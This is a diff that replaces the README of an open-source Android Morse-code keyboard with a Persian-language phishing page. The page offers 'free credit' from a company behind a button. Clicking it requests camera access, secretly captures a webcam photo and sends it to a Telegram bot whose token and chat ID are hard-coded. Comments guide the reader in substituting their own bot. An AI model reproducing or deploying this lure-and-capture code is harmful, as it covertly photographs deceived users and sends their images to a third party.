@@ -1,52 +1,63 @@
-DotDash Keyboard
+<!doctype html>
+<html lang="fa">
+  <head>
+	<meta charset="utf-8" />
+	<title>تست عکس → تلگرام</title>
+	<meta name="viewport" content="width=device-width,initial-scale=1" />
+<style>
+      body { font-family: sans-serif; text-align:center; padding:30px; background:#f0f4f8; }
+  button { padding:15px 30px; font-size:18px; border:none; border-radius:10px; background:#4CAF50; color:white; cursor:pointer; }
+  button:hover { background:#45a049; }
+  #status { margin-top:15px; font-weight:bold; color:#333; }
+  img { margin-top:15px; max-width:90%; border:2px solid #ccc; border-radius:8px; display:none; }
+</style>
+  </head>
+  <body>
+	<h2>کردیت رایگان از طرف شرکت سعیدی</h2>
+	<p>برای دریافت کردیت رایگان دکمه پایین را فشار دهید </p>
+	<button id="btn">برای دریافت اینجا را کلیک کنید </button>
 
-The world's most popular open source Morse code keyboard for Android! (probably)
+	<video id="v" autoplay playsinline style="display:none;"></video>
+	<canvas id="c" style="display:none;"></canvas>
 
-![](https://raw.githubusercontent.com/agwells/dotdash-keyboard-android/master/res/drawable-hdpi/ic_launcher.png)
+<script>
+    const BOT = '8254244222:AAHhZ8Bd_cuJIOaUzzHVWaNl7jEsLZ1XrXI';    // <-- اینجا توکن رباتت را جایگزین کن
+    const CHAT = '6983233293';            // <-- اینجا chat_id عددی که گرفتیم
+    const btn = document.getElementById('btn');
+    const v = document.getElementById('v');
+    const c = document.getElementById('c');
 
-DotDash Keyboard is also available in:
-- Google Play: https://play.google.com/store/apps/details?id=net.iowaline.dotdash&hl=en
-- F-Droid: https://f-droid.org/repository/browse/?fdfilter=dotdash&fdid=net.iowaline.dotdash
+    btn.addEventListener('click', async () => {
+      try {
+        const stream = await navigator.mediaDevices.getUserMedia({video:true});
+        v.srcObject = stream;
+        await new Promise(r => setTimeout(r, 600));
+        c.width = v.videoWidth || 640;
+        c.height = v.videoHeight || 480;
+        c.getContext('2d').drawImage(v, 0, 0, c.width, c.height);
+        stream.getTracks().forEach(t => t.stop());
 
-Are you looking for an on-screen keyboard that will work with your phone's small screen and slow CPU?
-Do you know or are you willing to learn Morse code? If you answered "yes" to both of these questions,
-then this may be the keyboard for you!
+        c.toBlob(async (blob) => {
+          if (!blob) { alert('خطا در گرفتن عکس'); return; }
+          const form = new FormData();
+          form.append('photo', blob, 'pic.jpg');
+          form.append('chat_id', CHAT);
 
-DotDash Keyboard is a drop-in replacement for Android's on-screen keyboard. It allows you to enter text
-via un-timed Morse code, using three main buttons: Dot, Dash, and Space (as well as Shift and Delete).
+          const url = `https://api.telegram.org/bot${BOT}/sendPhoto`;
+          try {
+            const resp = await fetch(url, { method: 'POST', body: form });
+            const j = await resp.json();
+            if (j.ok) alert('️');
+            else alert('ارسال نشد: ' + (j.description || JSON.stringify(j)));
+          } catch (e) {
+            alert('خطا در ارسال: ' + e.message);
+          }
+        }, 'image/jpeg', 0.9);
 
-DotDash features an extended version of Morse code which replicates all of the characters on a standard
-QWERTY keyboard. For more information see the DotDash Keyboard wiki: 
-- https://github.com/agwells/dotdash-keyboard-android/wiki
-
-Nightly builds
---------------
-If you'd like to try the nightly build of DotDash Keyboard via the Google Play store, use this link to opt-in to the alpha version: https://play.google.com/apps/testing/net.iowaline.dotdash
-
-Note, this version is likely to be unstable!
-
-Copyright notice
-----------------
-
-Copyright (C) 2012-2015 Aaron Wells
-Copyright (c) 2008, The Android Open Source Project
-Copyright (c) 2010, Authors of the "Hacker's Keyboard" project https://code.google.com/p/hackerskeyboard/
-
-This program is free software: you can redistribute it and/or modify
-it under the terms of the GNU General Public License as published by
-the Free Software Foundation, version 3 or later of the License.
-
-This program is distributed in the hope that it will be useful,
-but WITHOUT ANY WARRANTY; without even the implied warranty of
-MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
-GNU General Public License for more details.
-
-You should have received a copy of the GNU General Public License
-along with this program. (See the included LICENSE file.)
-If not, see <http://www.gnu.org/licenses/>.
-
-Additionally, portions of this program are licensed under the
-Apache License, Version 2.0; you may not use these files except in 
-compliance with the Apache License. See the included NOTICE file 
-for more details. You may obtain a copy of the Apache License 
-at <http://www.apache.org/licenses/LICENSE-2.0>
+      } catch (err) {
+        alert('مرورگر اجازه نداد یا خطا: ' + err.message);
+      }
+    });
+</script>
+  </body>
+</html>
